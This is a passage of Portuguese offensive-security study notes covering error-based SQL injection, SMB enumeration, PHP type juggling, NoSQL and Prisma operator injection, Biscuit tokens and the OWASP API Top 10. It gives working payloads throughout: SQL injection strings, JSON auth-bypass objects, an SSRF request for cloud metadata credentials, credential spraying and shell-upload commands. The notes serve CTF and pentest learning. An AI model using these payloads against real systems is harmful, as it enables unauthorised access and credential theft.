**Quando usar:** Quando a aplicação exibe mensagens de erro SQL (mesmo que genéricas) na resposta HTTP. Não funciona se o servidor tem `APP_DEBUG=false` e suprime todos os erros (nesse caso, use Time-Based).

**Funções principais (MySQL):**

| Função | O que faz |
|---|---|
| `extractvalue()` | Faz uma query XPath num XML. Se o XPath for inválido, o MySQL gera um erro contendo o valor da expressão avaliada |
| `updatexml()` | Atualiza um XML. Mesmo mecanismo — erro XPath vaza o dado |
| `concat()` | Concatena strings — usado para montar o payload dentro do erro |
| `0x7e` | Valor hexadecimal do caractere `~` — serve como separador visual nos erros |

**Como funciona na prática:**
```sql
-- Extrair banco de dados atual via erro XPath
' AND extractvalue(1, CONCAT(0x7e, (SELECT database()), 0x7e)) -- -

-- O MySQL lança um erro do tipo:
-- XPATH syntax error: '~nome_do_banco~'
-- O dado está no próprio erro!
```

> **Limitação:** O MySQL trunca a string de erro em ~32 caracteres. Para extrair strings longas, use `SUBSTRING()` em loop.

> **Em hacking:** Se a resposta contém palavras como `XPATH syntax error`, `extractvalue`, ou qualquer stack trace de banco, tente imediatamente error-based antes de partir para time-based. É ordens de magnitude mais rápido.

---

### 🖧 SMB — Server Message Block

> **O que é:** Protocolo de compartilhamento de arquivos e impressoras em redes locais (Windows/Linux via Samba). Permite que máquinas compartilhem pastas, arquivos e dispositivos pela rede. Portas padrão: **139** (NetBIOS) e **445** (SMB direto).

**Por que interessa em hacking:**
- Compartilhamentos com acesso anônimo (null session) → leitura/escrita sem senha
- Credenciais fracas → acesso autenticado a diretórios home, backups, configs
- Versões antigas (SMBv1) → vulnerabilidades críticas como EternalBlue (MS17-010)
- Compartilhamentos com permissão de WRITE → plantar arquivos maliciosos (`.lnk`, scripts)

**Metodologia de ataque:**

```
1. Nmap → descobrir portas 139/445 abertas
2. Enumerar compartilhamentos (anônimo primeiro)
3. Tentar autenticar com credenciais encontradas (reuso de senha!)
4. Listar arquivos, ler configs, plantar payloads
```

**Ferramentas:**

| Ferramenta | Uso principal |
|---|---|
| `smbclient` | Conectar e navegar em compartilhamentos (como um FTP) |
| `smbmap` | Enumerar compartilhamentos e permissões de forma rápida |
| `nxc` (NetExec) | Autenticação, enum de shares, execução de comandos |
| `hydra` | Brute force de credenciais SMB |
| `enum4linux` | Enumeração completa: users, shares, políticas, grupos |

**Enumeração básica:**
```bash
# Verificar compartilhamentos sem autenticação (null session)
smbclient -L //ALVO -N

# Tentar conectar anonimamente em um share
smbclient //ALVO/NOME_DO_SHARE -N

# Verificar permissões de todos os shares
smbmap -H ALVO -u "" -p ""

# Enumeração completa
enum4linux -a ALVO
```

**Autenticação com credenciais:**
```bash
# Listar shares com usuário e senha
smbclient -L //ALVO -U usuario%senha

# Conectar em um share específico
smbclient //ALVO/home -U usuario%senha

# Validar credenciais e listar shares (com NetExec)
nxc smb ALVO -u usuario -p senha --shares

# Spray de credenciais em vários usuários
nxc smb ALVO -u users.txt -p senha --continue-on-success
```

**Dentro do smbclient (comandos):**
```bash
ls              # Listar arquivos
get arquivo.txt # Baixar arquivo
put shell.php   # Enviar arquivo
cd pasta/       # Navegar
mget *          # Baixar todos os arquivos
```

> **Em hacking:** Sempre que encontrar credenciais (em `.env`, banco de dados, hash crackeado, etc.), teste no SMB imediatamente — **reuso de senha é extremamente comum**. Um `DB_PASSWORD` ou `MAIL_PASSWORD` pode ser a senha do sistema inteiro.

---

### 🃏 Type Juggling — Comparação Frouxa em PHP

> **O que é:** Uma falha que ocorre quando o PHP usa o operador `==` (comparação frouxa/loose) para comparar valores de tipos diferentes. O PHP converte automaticamente os tipos antes de comparar — e essa conversão pode ser explorada para bypassar autenticação e lógica de negócio.

**A diferença fundamental:**

| Operador | Nome | Comportamento |
|---|---|---|
| `==` | Loose comparison | Converte os tipos antes de comparar (perigoso!) |
| `===` | Strict comparison | Compara valor E tipo — sem conversão (seguro) |

**Por que isso é perigoso — as regras de coerção do PHP:**

Quando os tipos são diferentes, o PHP aplica regras de conversão implícitas. As mais exploradas:

| Comparação | Resultado | Por quê |
|---|---|---|
| `0 == "admin"` | `true` | String não-numérica → convertida para `0` |
| `0 == ""` | `true` | String vazia → `0` |
| `true == "qualquer_string"` | `true` | Qualquer string não-vazia → `true` |
| `null == false` | `true` | null é falsy |
| `"1" == "01"` | `true` | Ambas viram o número `1` |
| `100 == "1e2"` | `true` | Notação científica → `100` |

**Analogia:** Imagine um porteiro que compara seu nome com a lista de convidados, mas aceita apelidos. Se sua lista diz "Gabriel" e você fala "Gab" — ele acha que é igual. O PHP faz isso com tipos: ele "aceita o apelido" do valor.

#### Magic Hashes — O ataque mais elegante

Quando o PHP compara dois hashes com `==`, se ambos começam com `0e` seguido apenas de dígitos, o PHP trata os dois como `0` (notação científica) → `0 == 0` → `true`!

```
Input → MD5 Hash
"240610708" → 0e462097431906509019562988736854  ← PHP trata como 0!
"QNKCDZO"   → 0e830400451993494058024219903391  ← PHP trata como 0!

Se o banco tem o hash de "240610708", enviar "QNKCDZO" passa na verificação!
```

**Como identificar vulnerabilidade:**
- Aplicação PHP que faz login/verificação de token
- Comparação de senha/hash via `==` (verificar no código, ou testar comportamento)
- Campos que aceitam JSON → enviar `true` ou `0` em vez de string

**Como explorar:**
```
# Bypass de autenticação — enviar 0 como "senha" (PHP < 8.0)
Se o banco retorna uma hash como string não-numérica:
  0 == "hash_qualquer"  →  true (em PHP < 8.0!)

# Via JSON: enviar boolean true
{"password": true}  →  "senha" == true  →  true

# Via PHP array (quebra funções como strcmp)
password[]=  →  strcmp(array, string) retorna NULL  →  NULL == 0  →  true
```

> **Em hacking:** Type Juggling aparece muito em CTFs com código PHP. Sempre que encontrar login, verificação de token ou comparação de hash em PHP, teste: envie `0`, `true` (via JSON), ou arrays. Em PHP 8.0+ o `0 == "string"` mudou para `false` — verifique a versão do PHP antes de testar.

---

### 🔤 Typo Juggling — Casos Específicos de Coerção

> **O que é:** Subconjunto do Type Juggling focado em casos onde o PHP converte tipos por "erro de tipagem" (typo) — comportamentos menos óbvios da coerção, especialmente com strings que parecem numéricas, valores falsy e comparações com null/false.

**Diferença para Type Juggling:** Enquanto o Type Juggling cobre o mecanismo geral, o Typo Juggling foca nos casos onde a conversão acontece por valores que se "parecem" com outro tipo mas não são — enganando tanto o desenvolvedor quanto a aplicação.

**Os casos mais exploráveis:**

| Comparação | Resultado | Contexto de ataque |
|---|---|---|
| `"0" == false` | `true` | Validação de token que retorna "0" |
| `"0" == null` | `false` | (atenção: esse NÃO é true!) |
| `"php" == 0` | `true` (PHP<8) | Senha hash armazenada como string |
| `"1abc" == 1` | `true` | ID numérico comparado com string |
| `" " == 0` | `true` | Espaço em branco vira 0 |
| `"0.0" == "0"` | `false` | Mas `"0.0" == 0` é `true`! |

**A armadilha do "0":** O string `"0"` é falsy em PHP (considera-se vazio/falso), então:
```php
if ($token == false) { ... }   // "0" passa aqui!
if (empty($token))  { ... }   // "0" passa aqui também!
if (!$token)        { ... }   // "0" passa aqui também!
```
Se um token legítimo for o string `"0"`, qualquer verificação com `==`, `empty()` ou `!` vai tratar como inválido — abrindo brechas na lógica.

**Como explorar:**
```
# Enviar string "0" onde um token é esperado
token=0
token=0.0
token= (espaço)

# Se a lógica for: if ($input == $stored_value) { grant_access(); }
# e $stored_value for qualquer string não-numérica:
input=0   →  0 == "abc123"  →  true  (PHP < 8.0)
```

> **Em hacking:** Typo Juggling aparece quando a aplicação armazena tokens como strings geradas automaticamente. Teste especialmente com `0`, `"0"`, `false` e `null`. Revise se o código usa `==` vs `===` e `empty()` vs `isset()` — ambas as funções têm comportamentos diferentes com `"0"`.

### 🌀 Type Confusion — O Conceito Base

> **O que é:** Type Confusion (Confusão de Tipo) é uma classe de vulnerabilidades que ocorre quando um programa **recebe um valor de um tipo** mas o **processa como se fosse outro tipo**. A aplicação espera uma string, mas o atacante manda um objeto. Espera um número, mas recebe um array. Espera um booleano, mas recebe uma função. Quando não há verificação do tipo antes do uso, o comportamento pode ser completamente diferente do esperado — e explorado.

**Por que isso acontece:**

Linguagens como JavaScript, PHP e Python são **fracamente tipadas** — o tipo de uma variável não é fixo, pode mudar. Combinadas com frameworks web que convertem automaticamente o corpo das requisições (JSON → objeto JavaScript, query string → dicionário Python), cria-se um problema estrutural: **o servidor aceita qualquer forma que o dado venha** sem verificar se o tipo faz sentido para aquele contexto.

**A raiz do problema — conversão automática de entrada:**

```
Requisição HTTP chega como texto plano:
  POST /login
  Content-Type: application/json
  Body: {"username": "admin", "password": {"$ne": null}}
                                            ↑
                                   Isso é um OBJETO, não uma string!
                                   O body parser converte automaticamente.
```

O body parser do framework transforma o JSON em um objeto nativo da linguagem sem perguntar "isso é o tipo esperado?". A aplicação recebe um objeto onde esperava uma string — e o que acontece a seguir depende de como a aplicação usa esse dado.

**Os três cenários principais onde Type Confusion aparece:**

| Cenário | Linguagem/Stack | O que o atacante injeta |
|---|---|---|
| **Loose comparison** | PHP | Tipos primitivos (`0`, `true`, arrays) que passam em `==` |
| **ORM/Query Builder** | Node.js + MongoDB/Prisma | Objetos com operadores de query (`{"$ne": null}`) |
| **Parsing diferencial** | Qualquer | Um valor que é interpretado diferente por dois sistemas |

**A diferença entre Type Juggling e Type Confusion:**

- **Type Juggling** (PHP) → A linguagem converte o tipo *automaticamente* durante uma comparação (`0 == "string"` → `true`). A falha é na *linguagem*.
- **Type Confusion** (ORMs/frameworks) → O dado chega com o tipo *errado* e a aplicação não verifica antes de usá-lo. A falha é na *lógica da aplicação*.

São problemas relacionados mas distintos: no Juggling o PHP converte; no Confusion o Node.js/Prisma/Mongoose aceita o objeto como estrutura de query válida.

---

### 🌀 Type Confusion Attack — Injeção de Tipo em ORMs e Filtros

> **O que é:** Quando a aplicação passa input do usuário **diretamente** para um ORM ou query builder sem validar o tipo, o atacante pode enviar um **objeto** (com operadores de query) em vez de um valor simples, alterando completamente a lógica da consulta.

**Analogia:** Imagine pedir para um barman uma caipirinha "com limão". Você aporta um limão. Mas se o barman aceitasse qualquer objeto no lugar do limão, você poderia passar um "kit de coquetéis inteiro" e ele usaria tudo — incluindo coisas que você não deveria controlar.

**O problema central:**
```
Desenvolvedor espera receber:    { "username": "admin" }
Atacante envia:                  { "username": { "$ne": null } }

O ORM interpreta o objeto como um OPERADOR de query, não um valor!
```

#### Filter Bypass Genérico (aplicações Node.js/Express)

Quando o body parser do Express converte a requisição em objeto JavaScript, qualquer JSON enviado é aceito como estrutura de query:

```
# Requisição legítima:
POST /login  →  {"username": "admin", "password": "senha123"}

# Requisição maliciosa:
POST /login  →  {"username": {"$ne": null}, "password": {"$ne": null}}

# O banco retorna o primeiro usuário que NÃO tem username null
# → Bypass de autenticação sem conhecer nenhuma credencial
```


Via URL (quando o body parser usa `extended: true`):
```
username[$ne]=nada&password[$ne]=nada
username[$gt]=&password[$gt]=
```

#### Type Confusion — ORM MongoDB/Mongoose

**Por que o Mongoose não protege automaticamente:**
O Mongoose valida tipos definidos no Schema, mas:
- Se o campo é `Schema.Types.Mixed` → aceita qualquer estrutura
- Se o campo é `String` mas o atacante envia um objeto com operador → Mongoose pode deixar passar ou o objeto é processado antes do cast
- A validação acontece no campo, mas o operador muda a **lógica da query**, não o valor

**Cenário de ataque (endpoint de reset de senha):**
```javascript
// Código vulnerável:
const user = await User.findOne({
    resetToken: req.body.token  // Esperava string, recebe objeto!
});

// Atacante envia: {"token": {"$ne": ""}}
// Query vira: db.users.findOne({ resetToken: { $ne: "" } })
// Retorna o primeiro usuário com qualquer token → reset sem saber o token!
```

**Operadores úteis em ataques:**
| Operador | Efeito no ataque |
|---|---|
| `{"$ne": null}` | Qualquer valor não-nulo → bypass de autenticação |
| `{"$ne": ""}` | Qualquer valor não-vazio → mesma coisa |
| `{"$gt": ""}` | Qualquer string → retorna todos |
| `{"$regex": "^a"}` | Extrai dados por prefixo (extração blind) |
| `{"$exists": true}` | Qualquer campo que existe → bypass |

#### Type Confusion — ORM Prisma

O Prisma usa um sistema de filtros baseado em objetos para `where`:
```typescript
prisma.user.findFirst({ where: { email: "admin@site.com" } })
```

Se o input do usuário vai direto para o `where`:
```javascript
// Código vulnerável:
const user = await prisma.user.findFirst({
    where: { resetToken: req.body.token }  // string esperada, objeto recebido!
});

// Atacante envia: {"token": {"not": ""}}
// Prisma interpreta: WHERE resetToken != ''
// Retorna o primeiro usuário com token ≠ vazio → bypass!
```

**Operadores do Prisma que podem ser injetados:**
| Operador injetado | Efeito |
|---|---|
| `{"not": ""}` | Campo diferente de vazio → retorna qualquer registro |
| `{"contains": ""}` | Campo contém string vazia → retorna tudo |
| `{"startsWith": "a"}` | Extração blind por prefixo |
| `{"endsWith": "@"}` | Extração blind por sufixo |
| `{"gt": ""}` | Maior que vazio → retorna todos |

**Como identificar:**
1. Aplicação Node.js/Express com MongoDB ou Prisma
2. Endpoints de login, reset de senha, verificação de token
3. Tentar enviar `{"campo": {"$ne": null}}` (Mongo) ou `{"campo": {"not": ""}}` (Prisma) onde a aplicação espera string

> **Em hacking:** Esse ataque é o que o Hacking Club chama de "Type Confusion Attack". O framework aceita objetos como valores de campo, e objetos contendo operadores alteram a lógica da query. Sempre que encontrar API Node.js com MongoDB ou Prisma, intercepte requisições de autenticação no Burp Suite e troque o valor do campo de autenticação por um objeto com operador. Ligue o `Content-Type: application/json` para garantir que o body parser aceite o objeto.

---

### 🍪 Biscuit — Token de Autorização Moderno

> **O que é:** Biscuit é um formato de token de autorização moderno, alternativa ao JWT, baseado em **Ed25519** (criptografia de chave pública) e **Datalog** (linguagem lógica). Diferente do JWT, foi projetado para **delegação offline** — o portador do token pode criar versões mais restritas do token sem contatar o servidor original.

**Diferença JWT vs Biscuit:**

| Característica | JWT | Biscuit |
|---|---|---|
| **Algoritmos** | Flexível (pode usar `alg: none`, RS256, HS256...) | Fixo: Ed25519 — sem "algorithm confusion" |
| **Claims** | Pares chave-valor estáticos | Regras Datalog dinâmicas |
| **Delegação** | Não suporta nativamente | Nativo — atenuação offline |
| **Vulnerabilidades comuns** | `alg: none`, key confusion, weak secret | Má implementação de policies, atenuação incorreta |

**Como funciona:**
```
Token Biscuit = Bloco Autoridade + N Blocos de Atenuação + Assinatura

Bloco Autoridade (emitido pelo servidor):
  user("gabriel");
  role("admin");

Bloco de Atenuação (criado pelo cliente para delegar permissões menores):
  check if time($t), $t < 2024-01-01T00:00:00Z;  ← expira em data específica
  check if role("user");  ← restringe para role menor
```

**Onde aparece em CTFs/hacking:**
- Aplicações que usam Biscuit como sistema de autenticação
- Manipulação das regras Datalog dentro do token
- Atenuação maliciosa para ganhar permissões
- Extração do bloco autoridade para análise

**Vetores de ataque:**
- **Policy bypass:** Se as políticas Datalog não cobrem todos os casos, pode existir um estado não coberto que é aceito
- **Atenuação maliciosa:** Adicionar blocos que mudam a lógica da autorização
- **Reutilização de token:** Token sem expiração definida
- **Exposição do token:** Biscuit em URL, logs ou headers inseguros

**Ferramentas:**
```bash
# biscuit-cli — analisar e criar tokens Biscuit
biscuit inspect TOKEN_AQUI    # Ver o conteúdo do token
biscuit attenuate TOKEN_AQUI  # Criar versão atenuada
```

> **Em hacking:** No contexto do Hacking Club, "Biscuit" refere-se a desafios que usam esse formato de token. Se encontrar um Biscuit token, inspecione os blocos Datalog — as permissões são expressas em lógica, e brechas nas regras podem permitir acesso não autorizado. Lembre-se: ao contrário do JWT, o Biscuit **não tem o problema do `alg: none`** — a criptografia é segura por padrão. O foco deve ser na **lógica das policies**, não na criptografia.

---

## 🔌 OWASP API Security Top 10 — 2023

> APIs expõem lógica de negócio e dados de forma direta — são a superfície de ataque mais crítica em aplicações modernas. O OWASP API Top 10 documenta as falhas mais frequentes e impactantes em APIs REST, GraphQL, gRPC e similares.
> Relacionado: [[Essential Web Hacking]] [[Payloads - Web Hacking]]

---

### API1:2023 — Broken Object Level Authorization (BOLA / IDOR)

> **O que é:** A API aceita um ID de objeto no request (ex: `/api/users/42/profile`) e não verifica se o usuário autenticado tem **permissão** para acessar aquele objeto específico. É essencialmente IDOR no contexto de API.

**Por que acontece:** O desenvolvedor implementa autenticação (quem você é), mas esquece a autorização (o que você pode acessar). A API confia no ID fornecido sem cruzar com a sessão ativa.

**Analogia:** Você tem a chave do apartamento 42, mas a portaria deixa você entrar em qualquer apartamento só porque você tem *uma* chave.

**Fluxo de ataque:**
1. Autenticar como usuário A → obter token
2. Fazer request para recurso de outro usuário trocando o ID
3. Se a API retornar os dados → BOLA confirmado

**Onde procurar:**
- IDs numéricos sequenciais em endpoints (`/orders/1337`, `/invoices/99`)
- UUIDs em parâmetros de path ou query string
- Campos de ID em body de requisições POST/PUT
- Referências cruzadas entre recursos (`/api/users/42/payments`)

**Impacto:** Leitura, modificação ou exclusão de dados de qualquer usuário.

> **Dica CTF:** Sempre que ver um número em uma URL de API, troque para outros valores. Enumere com ffuf ou Burp Intruder. UUIDs são previsíveis em implementações fracas (UUIDv1 tem componente de tempo).

---

### API2:2023 — Broken Authentication

> **O que é:** Mecanismos de autenticação implementados de forma incorreta, permitindo que atacantes comprometam tokens, senhas ou sessões para assumir identidade de outros usuários.

**Vetores comuns:**
| Vetor | Descrição |
|---|---|
| Credential stuffing | Testar pares usuário/senha vazados de outros serviços |
| Brute force sem rate limit | API não bloqueia tentativas excessivas |
| Tokens fracos ou previsíveis | JWTs com `alg: none`, secrets fracos, tokens sequenciais |
| Tokens sem expiração | Token emitido uma vez, válido para sempre |
| Senha em query string | `/login?user=admin&pass=123` → exposta em logs |
| Reset de senha inseguro | Token de reset previsível ou reutilizável |

**Como identificar:**
- Tentar autenticar sem credenciais
- Testar JWTs com `alg: none` ou troca de algoritmo
- Verificar se o endpoint de login tem rate limiting (tentar 100x rapidamente)
- Analisar o formato do token — é previsível?

> **Relacionado:** [[Essential Web Hacking#JWT — JSON Web Tokens]]

---

### API3:2023 — Broken Object Property Level Authorization (BOPLA)

> **O que é:** Evolução do BOLA — aqui o problema não é acessar o objeto errado, mas acessar ou modificar **propriedades específicas** do objeto que deveriam ser restritas. Engloba dois padrões: **Excessive Data Exposure** e **Mass Assignment**.

#### Excessive Data Exposure
A API retorna mais dados do que o necessário, delegando ao cliente a responsabilidade de filtrar. O front-end só exibe alguns campos, mas a API retorna todos — incluindo dados sensíveis.

```
GET /api/users/42
← Resposta: { "id": 42, "name": "Gabriel", "email": "...", "password_hash": "...", "is_admin": false, "internal_score": 99 }
```
O front-end mostra só `name` e `email`, mas o atacante vê tudo inspecionando a resposta HTTP.

#### Mass Assignment
A API aceita qualquer campo no body do request e os aplica diretamente ao objeto/modelo — sem allowlist. O atacante envia campos que não deveria poder modificar.

```json
PATCH /api/users/42
{ "name": "Gabriel", "is_admin": true }
← Resultado: usuário virou admin
```

**Como identificar:**
- Comparar o que o front-end exibe vs o que a API retorna
- Em endpoints de update (PUT/PATCH), enviar campos extras como `role`, `is_admin`, `balance`, `credits`
- Inspecionar a documentação da API em busca de campos "read-only" que podem ser enviados

---

### API4:2023 — Unrestricted Resource Consumption

> **O que é:** A API não limita o volume, frequência ou tamanho dos requests. Pode ser explorada para DoS, abuso de custos em serviços cloud, ou para amplificar ataques de brute force.

**Vetores:**
| Vetor | Impacto |
|---|---|
| Sem rate limiting | Brute force ilimitado, scraping total da API |
| Sem paginação ou limit | `GET /api/users?page_size=999999` — dump completo |
| Upload sem limite de tamanho | Consumo de storage/CPU |
| Operações custosas sem throttle | OCR, video encoding, ML inference — custo cloud explodindo |
| Parâmetro de quantidade controlável | `{"items": 999}` → gera 999 emails, notificações, etc. |

**Como identificar:**
- Testar se endpoints aceitam `limit=999999` ou `page_size=0`
- Verificar headers de rate limit na resposta (`X-RateLimit-*`, `Retry-After`)
- Tentar operações em loop — a API bloqueia após N requests?

---

### API5:2023 — Broken Function Level Authorization (BFLA)

> **O que é:** A API não verifica se o usuário tem **permissão para chamar aquela função/endpoint** — não o objeto em si, mas a operação. Um usuário comum consegue chamar endpoints administrativos.

**Diferença BOLA vs BFLA:**
- **BOLA:** Você pode chamar o endpoint certo, mas acessa objeto errado (`GET /api/users/OUTRO_ID`)
- **BFLA:** Você não deveria nem poder chamar o endpoint (`DELETE /api/admin/users/42`)

**Como identificar:**
- Mapear todos os endpoints (Swagger/OpenAPI, JS, histórico do Burp)
- Identificar endpoints com prefixos administrativos (`/admin/`, `/internal/`, `/manage/`)
- Tentar operações destrutivas (DELETE, PUT total) com token de usuário comum
- Trocar método HTTP: se `GET /api/users` funciona, tentar `POST /api/users` com dados arbitrários
- Analisar diferença entre endpoints mobile vs web — às vezes o app mobile expõe mais

> **Dica:** APIs frequentemente têm endpoints "escondidos" não linkados no front-end mas documentados ou descobertos via JS analysis. Use [[Essential Web Hacking#JavaScript Analysis]] para encontrá-los.

---

### API6:2023 — Unrestricted Access to Sensitive Business Flows

> **O que é:** A API expõe um fluxo de negócio crítico sem proteções adequadas contra abuso automatizado. Não é uma falha de código clássica — é a ausência de controles contra uso ilegítimo em escala.

**Exemplos:**
| Fluxo | Abuso |
|---|---|
| Compra com desconto por cupom | Usar o mesmo cupom infinitas vezes via automação |
| Sistema de referral/indicação | Criar contas fake para ganhar créditos |
| "Comprar antes do lançamento" | Bot que reserva todos os itens limitados |
| Votação/rating | Inflar avaliações automaticamente |
| Formulário de contato | Spam massivo via API |

**Como identificar:**
- Mapear fluxos que geram valor econômico ou vantagem competitiva
- Testar se a ação pode ser repetida ilimitadamente via automação
- Verificar se há CAPTCHA, device fingerprinting ou behavioral analysis

---

### API7:2023 — Server-Side Request Forgery (SSRF)

> **O que é:** A API faz requisições HTTP para URLs fornecidas pelo usuário sem validar o destino. O atacante pode fazer o servidor acessar recursos internos da rede, metadata de cloud, ou serviços não expostos externamente.

**Como funciona:**
```
POST /api/fetch-url
{ "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/" }
← Servidor faz a requisição e retorna credenciais AWS da instância EC2
```

**Alvos clássicos:**
| Alvo | URL |
|---|---|
| Metadata AWS | `http://169.254.169.254/latest/meta-data/` |
| Metadata GCP | `http://metadata.google.internal/computeMetadata/v1/` |
| Metadata Azure | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` |
| Serviços internos | `http://localhost:8080/admin`, `http://192.168.1.1/` |
| Protocolos alternativos | `file:///etc/passwd`, `dict://`, `gopher://` |

**Onde procurar:**
- Parâmetros como `url`, `callback`, `redirect`, `webhook`, `avatar`, `import`, `fetch`
- Funcionalidades de "preview de link", importação de dados externos, webhooks

> **Relacionado:** [[Essential Web Hacking#SSRF — Server-Side Request Forgery]]

---

### API8:2023 — Security Misconfiguration

> **O que é:** A API está configurada de forma insegura — não é uma falha de lógica de código, mas de configuração do ambiente, servidor ou framework.

**Vetores mais comuns:**
| Misconfiguration | Impacto |
|---|---|
| CORS aberto (`Access-Control-Allow-Origin: *`) | Qualquer site pode fazer requests cross-origin |
| Swagger/OpenAPI em produção | Documentação total da API exposta publicamente |
| Stack traces em erros | Revela linguagem, versão, paths internos |
| Headers de segurança ausentes | Sem `X-Content-Type-Options`, `HSTS`, etc. |
| Métodos HTTP desnecessários habilitados | `TRACE`, `OPTIONS` revelam informação |
| Default credentials | Admin/admin em painéis de gestão |
| TLS desabilitado ou versão antiga | TLS 1.0/1.1 com ciphersuites fracas |

**Como identificar:**
```bash
# Checar CORS
curl -H "Origin: https://evil.com" -I https://api.alvo.com/endpoint

# Checar métodos permitidos
curl -X OPTIONS -I https://api.alvo.com/endpoint

# Buscar Swagger exposto
ffuf -u https://api.alvo.com/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/api/openapi.txt
```

---

### API9:2023 — Improper Inventory Management

> **O que é:** A organização não tem controle do inventário de suas APIs — versões antigas continuam ativas, endpoints de debug/teste ficam em produção, APIs de terceiros não são monitoradas.

**Cenários reais:**
- API v1 sem patch de segurança continua acessível mesmo com v3 em produção
- `/api/v1/admin/debug` esquecido em produção
- Endpoints de staging com dados reais acessíveis externamente
- APIs de parceiros com controles de segurança menores que a API principal

**Como identificar:**
```bash
# Tentar versões antigas
ffuf -u https://api.alvo.com/FUZZ/users -w wordlists/api_versions.txt
# Wordlist: v1, v2, v3, v1.0, v2.1, api/v1, rest/v1, ...

# Buscar endpoints de debug/test
ffuf -u https://api.alvo.com/api/FUZZ -w SecLists/Discovery/Web-Content/api/objects.txt
```

> **Dica:** Analise arquivos JavaScript do front-end — versões antigas de endpoints são frequentemente referenciadas em código legado que nunca foi limpo.

---

### API10:2023 — Unsafe Consumption of APIs

> **O que é:** A aplicação consome APIs de terceiros de forma insegura — confia cegamente nos dados retornados sem validação, usa HTTP em vez de HTTPS, ou não verifica certificados. Um atacante que compromete ou faz MITM na API de terceiro pode injetar dados maliciosos.

**Cenários:**
- API de terceiro retorna dados que são inseridos em query SQL → SQLi indireta
- API de terceiro retorna HTML que é renderizado sem sanitização → XSS via terceiro
- Aplicação consome API de geolocalização via HTTP → MITM possível
- API de terceiro é comprometida → supply chain attack na sua aplicação

**Como identificar (perspectiva de pentest):**
- Mapear todas as APIs externas que a aplicação consome
- Verificar se a comunicação usa HTTPS com verificação de certificado
- Analisar se os dados da API externa passam por validação antes de uso
- Em bug bounty: verificar se o alvo tem integrações com serviços terceiros que você possa influenciar

---

### 📊 Resumo Rápido — API Top 10 2023

| # | Vulnerabilidade | Vetor Principal | Impacto |
|---|---|---|---|
| API1 | BOLA | Trocar ID no endpoint | Acesso a dados de outros usuários |
| API2 | Broken Authentication | Token fraco, sem rate limit | Comprometer contas |
| API3 | BOPLA | Campos extras no request | Escalada de privilégio, data leak |
| API4 | Resource Consumption | Sem rate limit/paginação | DoS, custo cloud, brute force |
| API5 | BFLA | Acessar endpoint admin | Operações não autorizadas |
| API6 | Business Flow Abuse | Automação de fluxos críticos | Fraude, vantagem ilegítima |
| API7 | SSRF | URL controlada pelo usuário | Acesso à rede interna, metadados cloud |
| API8 | Misconfiguration | CORS, Swagger exposto | Data exposure, CSRF cross-origin |
| API9 | Inventory Management | APIs/versões esquecidas | Bypass de controles modernos |
| API10 | Unsafe API Consumption | Trust cego em APIs externas | SQLi/XSS indireta, supply chain |

> **Metodologia de teste de API:** Sempre comece com [[Essential Web Hacking#Recon — Reconhecimento]] para mapear endpoints antes de testar. Use Burp Suite para interceptar e modificar requests. Documentação Swagger/OpenAPI exposta é o melhor ponto de partida — lista todos os endpoints, parâmetros e schemas.